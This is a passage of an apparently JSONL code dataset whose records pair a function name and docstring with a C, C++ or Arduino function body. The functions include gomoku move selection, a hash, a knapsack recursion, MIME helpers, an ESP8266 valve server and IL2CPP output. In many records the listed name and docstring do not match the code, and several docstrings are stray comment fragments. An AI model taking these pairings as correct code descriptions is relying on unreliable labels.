Block \uc758 Priority\uc640 key1,key2\uac12\uc744 \uc9c0\uc815\ud574\uc8fc\uae30\uc704\ud55c \ud568\uc218\\n        }\\n        AddCautionList(list,clist);                         \/\/ \ub450\uba74 \uc548\ub418\ub294 \ucc29\uc218\uc810 \uc815\ubcf4\ub97c \ub2f4\uace0\uc788\ub294 \ubaa8\ub4e0 Block\ub4e4\uc744 clist\uc5d0 \ucd94\uac00\\n        Block* result =Compare_Block(list,clist);           \/\/ \ud604\uc7ac List\uc5d0 \uc800\uc7a5\ub41c \ubaa8\ub4e0 Block\ub4e4\uc744 \ube44\uad50\ud574 \uc801\ud569\ud55c Block\uc744 \ucd94\ub824\uc8fc\ub294 \ud568\uc218\\n        if(result!=NULL){                                   \/\/ \ub9cc\uc57d \ucc3e\uc740 Block \uc774 \uc5c6\ub2e4\uba74 \ub2e4\ub978 Shape \uc758 Block\uc744 \ucc3e\uc73c\ub85c \uc774\ub3d9\ud558\uace0 \ub9cc\uc57d \ucc3e\uc558\ub2e4\uba74\\n            ShowBlock(result);                              \/\/ \ucc3e\uc740 Block \uc758 data\ub97c \ucd9c\ub825\ud55c\ub2e4\\n            ShowMethod(result);\\n            int r= result->key.x;                           \/\/ \ucc29\uc218\uc810\uc758 \uc704\uce58\ub97c \ucd94\ub824\ub0b8\ub2e4\\n            return r;                                       \/\/ \ucc29\uc218\uc810\uc744 \ubc18\ud658\ud55c\ub2e4\\n        }\\n    }\\n    if(Find_Shape_3(list,example)){                         \/\/ Shape \uac00 3\uc778 \ube14\ub85d\uc744 \ucc3e\uc544\uc11c List\uc5d0 \ucd94\uac00\ud558\ub294 \uacfc\uc815\uc744 \ub2f4\uace0\uc788\ub294 \ud568\uc218\\n        for(int i=0; i<List_Count(list);i++){               \/\/ List\ub0b4\uc758 \uc874\uc7ac\ud558\ub294 \ubaa8\ub4e0 Block \uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c \ubc18\ubcf5\ubb38\\n            Block* temp = Select_ith_Block(i+1, list);\\n            Define_Block(temp, example);                    \/\/ Block \uc758 Priority\uc640 key1,key2\uac12\uc744 \uc9c0\uc815\ud574\uc8fc\uae30\uc704\ud55c \ud568\uc218\\n        }\\n        AddCautionList(list, clist);                        \/\/ \ub450\uba74 \uc548\ub418\ub294 \ucc29\uc218\uc810 \uc815\ubcf4\ub97c \ub2f4\uace0\uc788\ub294 \ubaa8\ub4e0 Block\ub4e4\uc744 clist\uc5d0 \ucd94\uac00\\n        Block* result =Compare_Block(list,clist);           \/\/ \ud604\uc7ac List\uc5d0 \uc800\uc7a5\ub41c \ubaa8\ub4e0 Block\ub4e4\uc744 \ube44\uad50\ud574 \uc801\ud569\ud55c Block\uc744 \ucd94\ub824\uc8fc\ub294 \ud568\uc218\\n        if(result!=NULL){                                   \/\/ \ub9cc\uc57d \ucc3e\uc740 Block \uc774 \uc5c6\ub2e4\uba74 \ub2e4\ub978 Shape \uc758 Block\uc744 \ucc3e\uc73c\ub85c \uc774\ub3d9\ud558\uace0 \ub9cc\uc57d \ucc3e\uc558\ub2e4\uba74\\n            ShowBlock(result);                              \/\/ \ucc3e\uc740 Block \uc758 data\ub97c \ucd9c\ub825\ud55c\ub2e4\\n            ShowMethod(result);\\n            int r= result->key.x;                           \/\/ \ucc29\uc218\uc810\uc758 \uc704\uce58\ub97c \ucd94\ub824\ub0b8\ub2e4\\n            return r;                                       \/\/ \ucc29\uc218\uc810\uc744 \ubc18\ud658\ud55c\ub2e4\\n        }\\n    }\\n    if(Find_Shape_4(list,example)){                         \/\/ Shape \uac00 4\uc778 \ube14\ub85d\uc744 \ucc3e\uc544\uc11c List\uc5d0 \ucd94\uac00\ud558\ub294 \uacfc\uc815\uc744 \ub2f4\uace0\uc788\ub294 \ud568\uc218\\n        for(int i=0; i<List_Count(list);i++){               \/\/ List\ub0b4\uc758 \uc874\uc7ac\ud558\ub294 \ubaa8\ub4e0 Block \uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c \ubc18\ubcf5\ubb38\\n            Block* temp = Select_ith_Block(i+1, list);\\n            Define_Block(temp, example);                    \/\/ Block \uc758 Priority\uc640 key1,key2\uac12\uc744 \uc9c0\uc815\ud574\uc8fc\uae30\uc704\ud55c \ud568\uc218\\n        }\\n        AddCautionList(list, clist);                        \/\/ \ub450\uba74 \uc548\ub418\ub294 \ucc29\uc218\uc810 \uc815\ubcf4\ub97c \ub2f4\uace0\uc788\ub294 \ubaa8\ub4e0 Block\ub4e4\uc744 clist\uc5d0 \ucd94\uac00\\n        Block* result =Compare_Block(list,clist);           \/\/ \ud604\uc7ac List\uc5d0 \uc800\uc7a5\ub41c \ubaa8\ub4e0 Block\ub4e4\uc744 \ube44\uad50\ud574 \uc801\ud569\ud55c Block\uc744 \ucd94\ub824\uc8fc\ub294 \ud568\uc218\\n        if(result!=NULL){                                   \/\/ \ub9cc\uc57d \ucc3e\uc740 Block \uc774 \uc5c6\ub2e4\uba74 \ub2e4\ub978 Shape \uc758 Block\uc744 \ucc3e\uc73c\ub85c \uc774\ub3d9\ud558\uace0 \ub9cc\uc57d \ucc3e\uc558\ub2e4\uba74\\n            ShowBlock(result);                              \/\/ \ucc3e\uc740 Block \uc758 data\ub97c \ucd9c\ub825\ud55c\ub2e4\\n            ShowMethod(result);\\n            int r = result->key.x;                          \/\/ \ucc29\uc218\uc810\uc758 \uc704\uce58\ub97c \ucd94\ub824\ub0b8\ub2e4\\n            return r;                                       \/\/ \ucc29\uc218\uc810\uc744 \ubc18\ud658\ud55c\ub2e4\\n        }\\n    }\\n    if(Find_Shape_5(list,example)){                         \/\/ Shape \uac00 5\uc778 \ube14\ub85d\uc744 \ucc3e\uc544\uc11c List\uc5d0 \ucd94\uac00\ud558\ub294 \uacfc\uc815\uc744 \ub2f4\uace0\uc788\ub294 \ud568\uc218\\n        for(int i=0; i<List_Count(list);i++){               \/\/ List\ub0b4\uc758 \uc874\uc7ac\ud558\ub294 \ubaa8\ub4e0 Block \uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c \ubc18\ubcf5\ubb38\\n            Block* temp = Select_ith_Block(i+1, list);\\n            Define_Block(temp, example);                    \/\/ Block \uc758 Priority\uc640 key1,key2\uac12\uc744 \uc9c0\uc815\ud574\uc8fc\uae30\uc704\ud55c \ud568\uc218\\n        }\\n        AddCautionList(list, clist);                        \/\/ \ub450\uba74 \uc548\ub418\ub294 \ucc29\uc218\uc810 \uc815\ubcf4\ub97c \ub2f4\uace0\uc788\ub294 \ubaa8\ub4e0 Block\ub4e4\uc744 clist\uc5d0 \ucd94\uac00\\n        Block* result =Compare_Block(list,clist);           \/\/ \ud604\uc7ac List\uc5d0 \uc800\uc7a5\ub41c \ubaa8\ub4e0 Block\ub4e4\uc744 \ube44\uad50\ud574 \uc801\ud569\ud55c Block\uc744 \ucd94\ub824\uc8fc\ub294 \ud568\uc218\\n        if(result!=NULL){                                   \/\/ \ub9cc\uc57d \ucc3e\uc740 Block \uc774 \uc5c6\ub2e4\uba74 \ub2e4\ub978 Shape \uc758 Block\uc744 \ucc3e\uc73c\ub85c \uc774\ub3d9\ud558\uace0 \ub9cc\uc57d \ucc3e\uc558\ub2e4\uba74\\n            ShowBlock(result);                              \/\/ \ucc3e\uc740 Block \uc758 data\ub97c \ucd9c\ub825\ud55c\ub2e4\\n            ShowMethod(result);\\n            int r = result->key.x;                          \/\/ \ucc29\uc218\uc810\uc758 \uc704\uce58\ub97c \ucd94\ub824\ub0b8\ub2e4\\n            return r;                                       \/\/ \ucc29\uc218\uc810\uc744 \ubc18\ud658\ud55c\ub2e4\\n        }\\n    }\\n    printf(\"----------------------------\\\\n\");\\n    printf(\"Printing part of rule...\\\\n\");\\n    printf(\"Shape : Not Detected, Priority : Not Detected\\\\n\");\\n    printf(\"Uesd Method : Solution 7\\\\n\");\\n    printf(\"----------------------------\\\\n\");\\n    return RandomPick(clist);                               \/\/ \uc704\uc5d0\uc11c \uc544\ubb34\ub7f0 \ucc29\uc218\uc810\ub3c4 \ucc3e\uc9c0 \ubabb\ud588\ub2e4\uba74 \uc808\ub300 \ub450\uba74 \uc54a\ub418\ub294 \uc790\ub9ac\ub97c \uc81c\uc678\ud55c \uc790\ub9ac\uc5d0 \ub454\ub2e4\\n}'}","id":4136}
{"content":"{'function_name': 'exclusive_geodesics', 'docstring': '\/\/ of self-loops by default. Return the measure for the entire graph.', 'code': 'float inclusive_geodesics(const Graph& g, DistanceMatrixMap dm, GeodesicMap gm)\\n{\\n    \/\/ Create a new measure object for computing the mean geodesic\\n    \/\/ distance of all vertices. This measure will actually be used\\n    \/\/ for both averages.\\n    inclusive_average< Graph, float, float > m;\\n\\n    \/\/ Compute the mean geodesic distance using the inclusive average\\n    \/\/ to account for self-loop distances. Return the measure for the\\n    \/\/ entire graph.\\n    return all_mean_geodesics(g, dm, gm, m);\\n}'}","id":4137}
{"content":"{'function_name': 'Hash', 'docstring': '\/\/???what about smaller than int?', 'code': \"inline int WangIntegerHash(int Key)\\n{\\n\\t\/\/if (sizeof(void*)==8) RealKey = Key[0] + Key[1];\\n\\n\\t\/\/ Don't remember where I found it\\n\\t\/\/Key = ~Key + (Key << 15); \/\/ Key = (Key << 15) - Key - 1;\\n\\t\/\/Key = Key ^ (Key >> 12);\\n\\t\/\/Key = Key + (Key << 2);\\n\\t\/\/Key = Key ^ (Key >> 4);\\n\\t\/\/Key = Key * 2057; \/\/ Key = (Key + (Key << 3)) + (Key << 11);\\n\\t\/\/Key = Key ^ (Key >> 16);\\n\\n\\t\/\/ Bullet Physics variant\\n\\tKey += ~(Key << 15);\\n\\tKey ^=  (Key >> 10);\\n\\tKey +=  (Key << 3);\\n\\tKey ^=  (Key >> 6);\\n\\tKey += ~(Key << 11);\\n\\tKey ^=  (Key >> 16);\\n\\treturn Key;\\n}\"}","id":4140}
{"content":"{'function_name': 'recursionLoadBag', 'docstring': '\/\/ rekurencja, wypelniamy plecak do max, brak cen przedmiotow', 'code': 'bool recursionPackingBag(vector <int> &spakowanePrzedmioty, vector <int> &przedmioty, int poczatek, int pojemnosc) {    \/\/rekurencja\\n    bool takNie;\\n\\tif (pojemnosc == 0) {\\n        return true;\\n\\t}\\n\\telse if (poczatek+1 > przedmioty.size() || pojemnosc < 0) {\\n        return false;\\n\\t}\\n\\tspakowanePrzedmioty.push_back(przedmioty[poczatek]);\\n    takNie = recursionPackingBag(spakowanePrzedmioty, przedmioty, poczatek + 1, pojemnosc - przedmioty[poczatek]);      \/\/pakujemy kolejny przedmiot (poczatek + 1), pojemnosc zmniejszamy o ten przedmiot zapakowany\\n\\n\\tif (takNie == 1) {\\n        return takNie;\\n\\t}\\n    else{\\n\\tspakowanePrzedmioty.pop_back();\\n\\ttakNie = recursionPackingBag(spakowanePrzedmioty, przedmioty, poczatek + 1, pojemnosc);\\n\\treturn takNie;\\n    }\\n}'}","id":4141}
{"content":"{'function_name': 'MimeOleMergePartialHeaders', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleParseRfc822Address(\\r\\n                                     DWORD               dwAdrType,\\r\\n                                     ENCODINGTYPE        ietEncoding,\\r\\n                                     LPCSTR              pszRfc822Adr,\\r\\n                                     LPADDRESSLIST       pList)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    CMimePropertyContainer cContainer;\\r\\n\\r\\n    \/\/ Parse the address\\r\\n    return cContainer.ParseRfc822(dwAdrType, ietEncoding, pszRfc822Adr, pList);\\r\\n}'}","id":4142}
{"content":"{'function_name': 'CreateCommandQueuesVIAamf', 'docstring': '\/\/ Create default CPU AMF context.', 'code': 'bool GetDeviceFromIndex(int deviceIndex, cl_device_id *device, cl_context *context, cl_device_type clDeviceType)\\n{\\n\\n#ifdef _WIN32\\n    HMODULE GPUUtilitiesDll = NULL;\\n    GPUUtilitiesDll = LoadLibraryA(\"GPUUtilities.dll\");\\n    if (NULL == GPUUtilitiesDll)\\n        return false;\\n\\n    typedef int(WINAPI * getDeviceAndContextType)(int devIdx, cl_context *pContext, cl_device_id *pDevice, cl_device_type clDeviceType);\\n    getDeviceAndContextType getDeviceAndContext = nullptr;\\n    getDeviceAndContext = (getDeviceAndContextType)GetProcAddress(GPUUtilitiesDll, \"getDeviceAndContext\");\\n    if (NULL == getDeviceAndContext)\\n        return false;\\n#endif\\n\\n    cl_context clContext = NULL;\\n    cl_device_id clDevice = NULL;\\n    \/\/get context of open device via index 0,1,2,...\\n    getDeviceAndContext(deviceIndex, &clContext, &clDevice, clDeviceType);\\n    if (NULL == clContext)\\n        return false;\\n    if (NULL == clDevice)\\n        return false;\\n\\n    *device = clDevice;\\n    *context = clContext;\\n    return true;\\n}'}","id":4152}
{"content":"{'function_name': 'SDLSoundExit', 'docstring': '\/\/dprintf(_T(\"SDLSoundExit\\\\n\"));\\r', 'code': 'static int SDLSetCallback(int (*pCallback)(int)) {\\r\\n    GetNextSound = pCallback;\\r\\n    \/\/dprintf(_T(\"SDL callback set\\\\n\"));\\r\\n\\treturn 0;\\r\\n}'}","id":4159}
{"content":"{'function_name': 'CompleteRemoteCertificateVerification', 'docstring': '\/\/', 'code': 'BOOL WINAPI \\nUpdateSecuritySettings(\\n    HANDLE LeasingApplication,\\n    Transport::SecuritySettings const* securitySettings)\\n{\\n    DWORD BytesReturned = 0;\\n    HRESULT WcharStringResult = E_FAIL;\\n\\n    UPDATE_SECURITY_SETTINGS_INPUT_BUFFER updateSecuritySettingsInputBuffer;\\n    ZeroMemory(&updateSecuritySettingsInputBuffer, sizeof(UPDATE_SECURITY_SETTINGS_INPUT_BUFFER));\\n\\n    \/\/\\n    \/\/ Check to see if the user mode lease layer \\n    \/\/ has been successfully initialized.\\n    \/\/\\n    if (!IsLeaseLayerInitialized()) {\\n\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Check arguments.\\n    \/\/\\n    if (NULL == LeasingApplication || INVALID_HANDLE_VALUE == LeasingApplication)\\n    {\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Populate device IOCTL input buffer.\\n    \/\/\\n    updateSecuritySettingsInputBuffer.LeasingApplicationHandle = LeasingApplication;\\n    updateSecuritySettingsInputBuffer.SecuritySettings = securitySettings;\\n\\n    \/\/\\n    \/\/ Send the update certificate Device IOCTL.\\n    \/\/\\n    auto DeviceIoctlReturn = DeviceIoControl(\\n        IOCTL_UPDATE_CERTIFICATE,\\n        &updateSecuritySettingsInputBuffer,\\n        sizeof(UPDATE_SECURITY_SETTINGS_INPUT_BUFFER),\\n        NULL, \\n        0,\\n        &BytesReturned);\\n\\n    return NT_SUCCESS(DeviceIoctlReturn)? TRUE : FALSE;\\n}'}","id":4160}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ \u0e41\u0e2a\u0e14\u0e07\u0e2b\u0e21\u0e32\u0e22\u0e40\u0e25\u0e02 IP \u0e02\u0e2d\u0e07 Server', 'code': 'void loop() {\\n WiFiClient client = server.available(); \/\/\u0e23\u0e2d\u0e23\u0e31\u0e1a \u0e01\u0e32\u0e23\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e21\u0e15\u0e48\u0e2d\u0e08\u0e32\u0e01 Client\\n Serial.println(WiFi.localIP());\\n delay(1000);\\n\\n\/\/ status of valve\\n if (status1_led==0) {\\n digitalWrite(Switches1,HIGH); \\n digitalWrite(LED2,LOW);\\n } \\n else {\\n digitalWrite(LED2,HIGH); \\n digitalWrite(Switches1,LOW); \\n } \\n if (status2_led==0) {\\n digitalWrite(Switches2,HIGH); \\n digitalWrite(LED4,LOW);\\n } \\n else {\\n digitalWrite(LED4,HIGH); \\n digitalWrite(Switches2,LOW); \\n } \\n\\n\/\/ running status \\n digitalWrite(LED3,HIGH);\\n delay(500);\\n digitalWrite(LED3,LOW);\\n\\nif (!client) { \/\/\u0e16\u0e49\u0e32\u0e44\u0e21\u0e48\u0e21\u0e35 Client \u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e34\u0e48\u0e21\u0e01\u0e31\u0e1a\u0e44\u0e1b\u0e27\u0e19 loop \u0e23\u0e2d\u0e23\u0e31\u0e1a\u0e43\u0e2b\u0e21\u0e48\\nreturn;\\n }\\n\\nSerial.println(\"new client\");\\n while(!client.available())\\n {\\n Serial.println(WiFi.localIP());\\n delay(1000);\\n\\n}\\n String req = client.readStringUntil(\\'\\\\r\\'); \/\/\u0e2d\u0e48\u0e32\u0e19\u0e04\u0e48\u0e32\u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a\u0e08\u0e32\u0e01client \u0e08\u0e32\u0e01\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e41\u0e23\u0e01\u0e16\u0e36\u0e07 \u2018\\\\r\u2019 \\nSerial.println(req); \/\/\u0e41\u0e2a\u0e14\u0e07\u0e04\u0e48\u0e32\u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a\u0e17\u0e32\u0e07 Serial\\n client.flush();\\n if (req.indexOf(\"\/a0\") != -1) \/\/\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e27\u0e48\u0e32 data \u0e17\u0e35\u0e48\u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e21\u0e35\u0e02\u0e49\u0e2d\u0e04\u0e27\u0e32\u0e21\u201d\/ledoff\u201d\\n\\n{\\nstatus1_led=0; \/\/\u0e16\u0e49\u0e32\u0e21\u0e35\u0e43\u0e2b\u0e49\u0e01\u0e33\u0e2b\u0e19\u0e14\u0e04\u0e48\u0e32 \u0e43\u0e19\u0e15\u0e31\u0e27\u0e41\u0e1b\u0e23\u0e43\u0e19 status_led=0\\ndigitalWrite(Switches1,HIGH); \/\/\u0e43\u0e2b\u0e49 LED \u0e14\u0e31\u0e1a\\ndigitalWrite(LED2,LOW); \\n Serial.println(\"LED OFF\");\\n }\\n else if(req.indexOf(\"\/a1\") != -1) \/\/\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e27\u0e48\u0e32 data \u0e17\u0e35\u0e48\u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e21\u0e35\u0e02\u0e49\u0e2d\u0e04\u0e27\u0e32\u0e21\u201d\/ledon\u201d\\n\\n{\\nstatus1_led=1; \/\/\u0e16\u0e49\u0e32\u0e21\u0e35\u0e43\u0e2b\u0e49\u0e01\u0e33\u0e2b\u0e19\u0e14\u0e04\u0e48\u0e32 \u0e43\u0e19\u0e15\u0e31\u0e27\u0e41\u0e1b\u0e23\u0e43\u0e19 status_led=1\\n digitalWrite(LED2,HIGH); \/\/\u0e43\u0e2b\u0e49 LED \u0e15\u0e34\u0e14\\ndigitalWrite(Switches1,LOW); \\n Serial.println(\"LED ON\");\\n } \\n if (req.indexOf(\"\/b0\") != -1) \/\/\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e27\u0e48\u0e32 data \u0e17\u0e35\u0e48\u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e21\u0e35\u0e02\u0e49\u0e2d\u0e04\u0e27\u0e32\u0e21\u201d\/ledoff\u201d\\n\\n{\\nstatus2_led=0; \/\/\u0e16\u0e49\u0e32\u0e21\u0e35\u0e43\u0e2b\u0e49\u0e01\u0e33\u0e2b\u0e19\u0e14\u0e04\u0e48\u0e32 \u0e43\u0e19\u0e15\u0e31\u0e27\u0e41\u0e1b\u0e23\u0e43\u0e19 status_led=0\\n digitalWrite(Switches2,HIGH); \/\/\u0e43\u0e2b\u0e49 LED \u0e14\u0e31\u0e1a\\ndigitalWrite(LED4,LOW); \\n Serial.println(\"LED OFF\");\\n }\\n else if(req.indexOf(\"\/b1\") != -1) \/\/\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e27\u0e48\u0e32 data \u0e17\u0e35\u0e48\u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e21\u0e35\u0e02\u0e49\u0e2d\u0e04\u0e27\u0e32\u0e21\u201d\/ledon\u201d\\n\\n{\\nstatus2_led=1; \/\/\u0e16\u0e49\u0e32\u0e21\u0e35\u0e43\u0e2b\u0e49\u0e01\u0e33\u0e2b\u0e19\u0e14\u0e04\u0e48\u0e32 \u0e43\u0e19\u0e15\u0e31\u0e27\u0e41\u0e1b\u0e23\u0e43\u0e19 status_led=1\\n digitalWrite(LED4,HIGH); \/\/\u0e43\u0e2b\u0e49 LED \u0e15\u0e34\u0e14\\ndigitalWrite(Switches2,LOW); \\n Serial.println(\"LED ON\");\\n } \\n \/\/\u0e40\u0e01\u0e47\u0e1a Code HTML \u0e25\u0e07\u0e43\u0e19\u0e15\u0e31\u0e27\u0e41\u0e1b\u0e23\u0e2a\u0e15\u0e23\u0e34\u0e07 web\\n String web = \"HTTP\/1.1 OK\\\\r\\\\nContent-Type: text\/html\\\\r\\\\n\\\\r\\\\n\";\\n web += \"<html>\\\\r\\\\n\";\\n web += \"<body>\\\\r\\\\n\";\\n web += \"<h1>LED Status<\/h1>\\\\r\\\\n\";\\n web += \"<p>\\\\r\\\\n\";\\n if(status1_led==1) \/\/ \u0e15\u0e23\u0e27\u0e08\u0e40\u0e0a\u0e47\u0e04\u0e2a\u0e16\u0e32\u0e19\u0e30\u0e02\u0e2d\u0e07 LED \u0e27\u0e48\u0e32 On \u0e2b\u0e23\u0e37\u0e2d Off\\n web += \"Vavle On\\\\r\\\\n\";\\n else\\n web += \"Vavle Off\\\\r\\\\n\";\\n web += \"<\/p>\\\\r\\\\n\";\\n web += \"<\/body>\\\\r\\\\n\";\\n web += \"<\/html>\\\\r\\\\n\";\\n client.print(web); \/\/\u0e2a\u0e48\u0e07 HTML Code \u0e44\u0e1b\u0e22\u0e31\u0e07 client\\n\\n }'}","id":4169}
{"content":"{'function_name': 'main_connect_loop', 'docstring': '\/\/pool.join();', 'code': 'int parse_send_messages(char *arg, std::vector<std::string>& send_msgs, int *numGetAddrToSend, char *payloadAddrFilename,\\n                        int *addr_timeoffset)\\n{\\n  std::vector<std::string> strs;\\n  std::string arg_str = std::string(arg);\\n  boost::split(strs, arg_str, boost::is_any_of(\"=\"));\\n  std::cout << \"\\\\n\";\\n  \/\/int i;\\n  \/\/for (i=0;i<=2;i++)\\n  \/\/    std::cout << i << \"->\" << strs[i] << \\' \\';\\n  \/\/std::cout << \"\\\\n\";\\n  if (std::find(send_message_types.begin(), send_message_types.end(), strs[0]) == send_message_types.end())\\n  {\\n      fprintf (stderr,\"Unknown message type: \\'%s\\'.\\\\n\",strs[0].c_str());\\n      printf(\"Try \\'%s -h\\' for more information\\\\n\", PACKAGE);\\n      return -1;\\n  }\\n  send_msgs.push_back(strs[0]);\\n  if (strs[0].compare(\"getaddr\") == 0)\\n    *numGetAddrToSend = 1; \\n  if(strs.size() >= 2)\\n  {\\n    if (strs[0].compare(\"getaddr\") == 0)\\n      *numGetAddrToSend = std::stoi(strs[1]); \\n    if (strs[0].compare(\"addr\") == 0)\\n      strcpy(payloadAddrFilename, strs[1].c_str()); \\n  }\\n  if(strs.size() >= 3 && (strs[0].compare(\"addr\") == 0))\\n      *addr_timeoffset = std::stoi(strs[2]); \\n  return 0;\\n}'}","id":4171}
{"content":"{'function_name': 'MimeOleCompareUrl', 'docstring': '\/\/ Done\\r', 'code': \"HRESULT MimeOleWrapHeaderText(CODEPAGEID codepage, ULONG cchMaxLine, LPCSTR pszLine,\\r\\n    ULONG cchLine, LPSTREAM pStream)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    ULONG       cchIndex=0;\\r\\n    ULONG       cchWrite;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    Assert(pszLine && pszLine[cchLine] == '\\\\0' && pStream && cchMaxLine >= 2);\\r\\n\\r\\n    \/\/ Start Writing\\r\\n    while(1)\\r\\n    {\\r\\n        \/\/ Validate\\r\\n        Assert(cchIndex <= cchLine);\\r\\n\\r\\n        \/\/ Compute cchWrite\\r\\n        cchWrite = min(cchLine - cchIndex, cchMaxLine - 2);\\r\\n\\r\\n        \/\/ Done\\r\\n        if (0 == cchWrite)\\r\\n        {\\r\\n            \/\/ Final Line Wrap\\r\\n            CHECKHR(hr = pStream->Write(c_szCRLF, 2, NULL));\\r\\n\\r\\n            \/\/ Done\\r\\n            break;\\r\\n        }\\r\\n\\r\\n        \/\/ Write the line\\r\\n        CHECKHR(hr = pStream->Write(pszLine + cchIndex, cchWrite, NULL));\\r\\n\\r\\n        \/\/ If there is still more text\\r\\n        if (cchIndex + cchWrite < cchLine)\\r\\n        {\\r\\n            \/\/ Write '\\\\r\\\\n\\\\t'\\r\\n            CHECKHR(hr = pStream->Write(c_szCRLFTab, 3, NULL));\\r\\n        }\\r\\n\\r\\n        \/\/ Increment iText\\r\\n        cchIndex += cchWrite;\\r\\n    }\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}\"}","id":4173}
{"content":"{'function_name': 'CDC_Control_FS', 'docstring': '\/* USER CODE END 5 *\/', 'code': 'static int8_t CDC_Receive_FS(uint8_t* Buf, uint32_t *Len)\\r\\n{\\r\\n    \/* USER CODE BEGIN 6 *\/\\r\\n    uint8_t n = *Len;\\r\\n    uint8_t i;\\r\\n    for (i = 0; i < n; i++)\\r\\n    {\\r\\n        if (Buf[i] == \\'\\\\r\\')\\r\\n        {\\r\\n            \/\/slcan_parse_str(slcan_str, slcan_str_index);\\r\\n            \/\/slcan_str_index = 0;\\r\\n\\r\\n            auto result = slcan_parse_str(slcan_str, slcan_str_index);\\r\\n            slcan_str_index = 0;\\r\\n\\r\\n            if(result == -1)\\r\\n            {\\r\\n                CDC_Transmit_FS((uint8_t *)\"\\\\a\", 1);\\r\\n            }\\r\\n            else if(result == 0)\\r\\n            {\\r\\n                CDC_Transmit_FS((uint8_t *)\"\\\\r\", 1);\\r\\n            }\\r\\n        }\\r\\n        else\\r\\n        {\\r\\n            slcan_str[slcan_str_index++] = Buf[i];\\r\\n        }\\r\\n    }\\r\\n\\r\\n\\r\\n    \/\/ prepare for next read\\r\\n    \/\/USBD_CDC_SetRxBuffer(hUsbDevice_0, UserRxBufferFS);\\r\\n    \/\/USBD_CDC_ReceivePacket(hUsbDevice_0);\\r\\n\\r\\n    USBD_CDC_SetRxBuffer(&hUsbDeviceFS, &Buf[0]);\\r\\n    USBD_CDC_ReceivePacket(&hUsbDeviceFS);\\r\\n    return (USBD_OK);\\r\\n    \/* USER CODE END 6 *\/\\r\\n}'}","id":4175}
{"content":"{'function_name': 'U3CGetEnumeratorU3Ec__Iterator0_MoveNext_m3393028403_gshared', 'docstring': '\/\/ Dead block : IL_0086: ldloc.1', 'code': 'bool U3CGetEnumeratorU3Ec__Iterator0_MoveNext_m1963761605_gshared (U3CGetEnumeratorU3Ec__Iterator0_t3577619118 * __this, const RuntimeMethod* method)\\n{\\n\\tuint32_t V_0 = 0;\\n\\tbool V_1 = false;\\n\\t{\\n\\t\\tint32_t L_0 = (int32_t)__this->get_U24PC_1();\\n\\t\\tV_0 = (uint32_t)L_0;\\n\\t\\t__this->set_U24PC_1((-1));\\n\\t\\tuint32_t L_1 = V_0;\\n\\t\\tswitch (L_1)\\n\\t\\t{\\n\\t\\t\\tcase 0:\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_0021;\\n\\t\\t\\t}\\n\\t\\t\\tcase 1:\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_0055;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tgoto IL_0082;\\n\\t}\\n\\nIL_0021:\\n\\t{\\n\\t\\t__this->set_U3CiU3E__0_0(0);\\n\\t\\tgoto IL_0063;\\n\\t}\\n\\nIL_002d:\\n\\t{\\n\\t\\tArrayReadOnlyList_1_t4212697511 * L_2 = (ArrayReadOnlyList_1_t4212697511 *)__this->get_U3CU3Ef__this_3();\\n\\t\\tNullCheck(L_2);\\n\\t\\tCustomAttributeTypedArgumentU5BU5D_t1524633796* L_3 = (CustomAttributeTypedArgumentU5BU5D_t1524633796*)L_2->get_array_0();\\n\\t\\tint32_t L_4 = (int32_t)__this->get_U3CiU3E__0_0();\\n\\t\\tNullCheck(L_3);\\n\\t\\tint32_t L_5 = L_4;\\n\\t\\tCustomAttributeTypedArgument_t3456354873  L_6 = (L_3)->GetAt(static_cast<il2cpp_array_size_t>(L_5));\\n\\t\\t__this->set_U24current_2(L_6);\\n\\t\\t__this->set_U24PC_1(1);\\n\\t\\tgoto IL_0084;\\n\\t}\\n\\nIL_0055:\\n\\t{\\n\\t\\tint32_t L_7 = (int32_t)__this->get_U3CiU3E__0_0();\\n\\t\\t__this->set_U3CiU3E__0_0(((int32_t)((int32_t)L_7+(int32_t)1)));\\n\\t}\\n\\nIL_0063:\\n\\t{\\n\\t\\tint32_t L_8 = (int32_t)__this->get_U3CiU3E__0_0();\\n\\t\\tArrayReadOnlyList_1_t4212697511 * L_9 = (ArrayReadOnlyList_1_t4212697511 *)__this->get_U3CU3Ef__this_3();\\n\\t\\tNullCheck(L_9);\\n\\t\\tCustomAttributeTypedArgumentU5BU5D_t1524633796* L_10 = (CustomAttributeTypedArgumentU5BU5D_t1524633796*)L_9->get_array_0();\\n\\t\\tNullCheck(L_10);\\n\\t\\tif ((((int32_t)L_8) < ((int32_t)(((int32_t)((int32_t)(((RuntimeArray *)L_10)->max_length)))))))\\n\\t\\t{\\n\\t\\t\\tgoto 